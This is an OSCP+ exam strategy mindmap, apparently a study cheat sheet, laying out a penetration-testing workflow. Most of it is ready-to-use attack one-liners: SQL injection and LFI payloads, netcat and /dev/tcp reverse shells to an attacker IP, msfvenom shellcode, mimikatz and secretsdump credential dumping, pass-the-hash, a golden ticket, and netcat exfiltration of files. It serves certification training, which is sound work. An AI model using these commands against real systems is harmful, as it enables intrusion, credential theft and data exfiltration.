# OSCP+ EXAM STRATEGY Mindmap

> 🔗 **Related Files**:
> - [Cheatsheet](https://github.com/outbacky/OSCP-Notes/blob/main/cheatsheet.md)
> - [Attack Phases Guide](https://github.com/outbacky/OSCP-Notes/blob/main/phases.md)

## 1. Preparation & Planning

### 1.1 Lab & Practice
- Verify lab machines (AD labs, standalone labs)
- Practice manual enumeration & exploitation (No sqlmap, etc.)
- Document your steps, build reporting templates

### 1.2 Exam Tooling & Restrictions
- Allowed: nmap, Burp Suite Free, Nikto, etc.
- Disallowed: Automated scanners (sqlmap, Nessus, etc.)
- Check official guidelines (no AI chatbot usage)

### 1.3 Time Management
- Allocate hours per machine (e.g., 2–3 hr per standalone)
- Budget enough time for AD set (all-or-nothing 40 points)
- Switch if stuck (avoid rabbit holes, revert if needed)

---

## 2. Initial Recon & Enumeration

📘 See [Cheatsheet: Enumeration](https://github.com/outbacky/OSCP-Notes/blob/main/cheatsheet.md#1-network-scanning) and [Phases: Recon](https://github.com/outbacky/OSCP-Notes/blob/main/phases.md#1-initial-reconnaissance)

### 2.1 Network Discovery
- `nmap -p- -sC -sV <target> -oA initial`
- Identify open ports/services
- **IF** no open ports → Double-check scanning approach

### 2.2 Service-Specific Enumeration
- **SMB** → smbclient, smbmap, rpcclient
- **FTP** → check anonymous login, read/write perms
- **HTTP** → Gobuster/FFUF, Nikto, manual parameter checks
- **SNMP** → snmpwalk (common community strings)
- **IF** credentials found → test them on all open services

### 2.3 Decision: Standalone vs. AD
- **IF** machine is standalone → proceed with typical local exploit paths
- **IF** domain environment → pivot to Active Directory enumeration

---

## 3. Web / Perimeter Exploitation Flow

📘 See [Cheatsheet: Web](https://github.com/outbacky/OSCP-Notes/blob/main/cheatsheet.md#2-web-enumeration--exploitation)

### 3.1 Web Application Scanning
- Manually look for forms, parameters
- Identify potential vulnerabilities (LFI, RFI, command injection)
- Use Burp Suite (Free) for intercept/repeater

### 3.2 SQL Injection (NO sqlmap)
- See [SQL Injection Guide](https://github.com/outbacky/OSCP-Notes/blob/main/phases.md#manual-sql-injection)

#### Identifying SQL Injection Vulnerabilities
- **Test Input Fields / URL Parameters:**
  - `' OR '1'='1` → Authentication bypass
  - `UNION SELECT 1,2,3--` → Identify number of columns
  - `SELECT table_name FROM information_schema.tables;` → List tables
- **IF** injection found → confirm DB type → proceed to extraction

#### Extracting Data
- **Determine Database Type:**
  - MySQL: `SELECT database(), version()`
  - MSSQL: `SELECT @@version`
- **Extract Table Names:**
  - `UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--`
- **Extract User Credentials:**
  - `UNION SELECT 1,username,password FROM users--`

#### Blind SQL Injection (Boolean/Time-Based)
- **Boolean-based:**
  - `id=1' AND 1=1--` (valid) vs. `id=1' AND 1=2--` (invalid)
- **Time-based:**
  - `id=1' AND IF(substr((SELECT database()),1,1)='a', SLEEP(3), 0)--`

### 3.3 Local File Inclusion (LFI)
- **Test Injection in URL Parameters:**
  - `../../../../etc/passwd` → Read system files
  - `php://filter/convert.base64-encode/resource=config.php` → Bypass filters

### 3.4 Command Injection
- **Test Injection in Forms / Parameters:**
  - `; whoami` or `&& ping -c1 <YOUR_IP>`
- **IF confirmed** → Craft reverse shell payload
  - `nc -e /bin/bash <YOUR_IP> <PORT>`
  - `bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1`

---

## 4. Network / Service Exploitation Flow

📘 See [Cheatsheet: Reverse Shells & Exploits](https://github.com/outbacky/OSCP-Notes/blob/main/cheatsheet.md#4-reverse-shells)

### 4.1 Exploiting Known Vulnerabilities
- **Check for vulnerabilities manually:**
  - `searchsploit <service>` → Look for known exploits
  - Read and modify exploit code for manual use

### 4.2 Buffer Overflow
📘 See [Phases: Buffer Overflow](https://github.com/outbacky/OSCP-Notes/blob/main/phases.md#buffer-overflow)

#### Exploit Development Workflow
1. **Fuzz** to find crash
2. **Find EIP overwrite offset:** `msf-pattern_create -l 3000`
3. **Identify bad characters** using a bytearray
4. **Find JMP ESP address**
5. **Generate shellcode**: `msfvenom -p windows/shell_reverse_tcp -b "<badchars>" -f python`
6. **Exploit & Get Shell**

### 4.3 Getting Initial Shell
- **Reverse Shell Commands (Linux & Windows):**
  - `nc -e /bin/bash <YOUR_IP> <PORT>`
  - `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<YOUR_IP>', <PORT>);"`

---

## 5. Privilege Escalation

📘 See [Cheatsheet: PrivEsc](https://github.com/outbacky/OSCP-Notes/blob/main/cheatsheet.md#6-privilege-escalation)

### 5.1 Enumeration
- **Windows:**
  - `whoami /all`, `systeminfo`, `wmic service get name,displayname,pathname,startmode`
- **Linux:**
  - `sudo -l`, `find / -perm -4000 -type f 2>/dev/null`

### 5.2 Exploitation Paths
- **Windows:**
  - Insecure services (`sc qc <service>` to check paths)
  - Token impersonation (`whoami /priv` → look for `SeImpersonatePrivilege`)
- **Linux:**
  - SUID binaries (`find / -perm -4000 -type f`)
  - Kernel exploits (`uname -a` → check for known privesc exploits)

### 5.3 Post-Exploitation
- **Credential Dumping:**
  - `mimikatz.exe "sekurlsa::logonpasswords"`
  - `impacket-secretsdump administrator@<IP>`
- **Pivoting:**
  - `proxychains nmap -sT -Pn -p 80,445 10.10.10.5`

---

## 6. Active Directory (AD) Attack Flow

📘 See [Phases: Active Directory](https://github.com/outbacky/OSCP-Notes/blob/main/phases.md#ad-attack-chain)

### 6.1 Enumeration
- **List domain users:** `net user /domain`
- **Extract SPNs:** `GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -request`

### 6.2 Credential Attacks
- **Kerberoasting:** Extract and crack hashes
  - `hashcat -m 13100 kerbhashes.txt rockyou.txt`
- **Pass-the-Hash:**
  - `wmiexec.py <DOMAIN>/<USER>@<IP> -hashes <NTLMHASH>`

### 6.3 Lateral Movement
- **WinRM Execution:** `evil-winrm -i <IP> -u <USER> -p <PASS>`
- **Remote Process Execution:** `psexec.py <DOMAIN>/<Administrator>@<IP> -hashes <NTLMHASH>`

### 6.4 Domain Admin Compromise
- **Golden Ticket Attack:**
  - `mimikatz # "kerberos::golden /domain:<DOMAIN> /sid:<SID> /krbtgt:<NTLM> /user:Administrator /ptt"`

---

## 7. Reporting & Documentation

📘 See [Phases: Reporting](https://github.com/outbacky/OSCP-Notes/blob/main/phases.md#reporting)

### 7.1 Notes As You Go
- **Screen captures:** `whoami`, proof.txt
- **Save critical commands:** Exploit code, offsets, etc.

### 7.2 Structure
- **Executive summary** + **technical details**
- **Each machine:** Enumeration → Exploitation → PrivEsc

### 7.3 Exam Submission
- **Final check** → all `local.txt` & `proof.txt`
- **Correct file naming & required sections**
- **Submit before deadline**

### 7.4 Flag Collection & Storage

#### Finding Flags
- **Linux:**
  ```bash
  find / -name "local.txt" -o -name "proof.txt" 2>/dev/null
  ```
- **Windows:**
  ```powershell
  Get-ChildItem -Path C:\ -Recurse -Include local.txt,proof.txt -ErrorAction SilentlyContinue
  # or
  dir C:\ /s /b | findstr /i "local.txt proof.txt"
  ```

#### Saving to `/results/{IP}/loot/`
```bash
mkdir -p /results/{IP}/loot/
scp user@{IP}:/path/to/proof.txt /results/{IP}/loot/
```

#### With netcat (if you have a shell on target):
_Target:_
```bash
cat /root/proof.txt | nc <YOUR_IP> 4444
```
_Attacker:_
```bash
nc -lvnp 4444 > /results/{IP}/loot/proof.txt
```

#### Finalize
```bash
echo "[*] local.txt: $(cat /tmp/local.txt)" | tee /results/{IP}/loot/local.txt
echo "[*] proof.txt: $(cat /tmp/proof.txt)" | tee /results/{IP}/loot/proof.txt
```


